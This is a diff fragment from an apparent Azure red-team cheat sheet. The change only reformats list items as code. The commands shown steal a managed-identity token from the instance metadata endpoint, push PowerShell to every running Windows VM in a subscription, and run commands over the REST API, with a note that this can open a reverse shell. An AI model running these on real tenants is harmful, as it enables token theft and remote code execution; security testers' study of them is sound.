@@ -24,18 +24,18 @@
 
 # 2) Az Powershell module
 
- - $VMs = Get-AzVM -Status | where {($_.PowerState -EQ "VM running") -and ($_.StorageProfile.OSDisk.OSType -eq "Windows")}
+    $VMs = Get-AzVM -Status | where {($_.PowerState -EQ "VM running") -and ($_.StorageProfile.OSDisk.OSType -eq "Windows")}
 
- - $VMs | select ResourceGrouName,Name (List the running Windows VMs and cast them to the VMs variable)
+    $VMs | select ResourceGrouName,Name (List the running Windows VMs and cast them to the VMs variable)
 
- - echo "whoami" > whoami.ps1
+    echo "whoami" > whoami.ps1
 
- - $VMs | Invoke-AzVMRunCommand -CommandId 'RunPowerShellScript' -ScriptPath .\whoami.ps1 (Run your powershell script on all VMs in the subscription)
+    $VMs | Invoke-AzVMRunCommand -CommandId 'RunPowerShellScript' -ScriptPath .\whoami.ps1 (Run your powershell script on all VMs in the subscription)
 
 # 3) Azure REST APIs
 
- - curl -H Metadata:true -s 'http://169.254.169.254/metadata/identity/oauth2/token?apiversion=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' | jq (Obtain an access token that can be used to access the Azure management API endpoint)
+    curl -H Metadata:true -s 'http://169.254.169.254/metadata/identity/oauth2/token?apiversion=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' | jq (Obtain an access token that can be used to access the Azure management API endpoint)
 
- - $mgmtToken = "TOKEN_HERE"
+    $mgmtToken = "TOKEN_HERE"
 
- - Invoke-AzVMCommandREST -commandToExecute "whoami > test.txt" -managementToken $mgmtToken TENANT_ID (Run a command via REST API method. You can use this to start a reverse shell on target)
+    Invoke-AzVMCommandREST -commandToExecute "whoami > test.txt" -managementToken $mgmtToken TENANT_ID (Run a command via REST API method. You can use this to start a reverse shell on target)
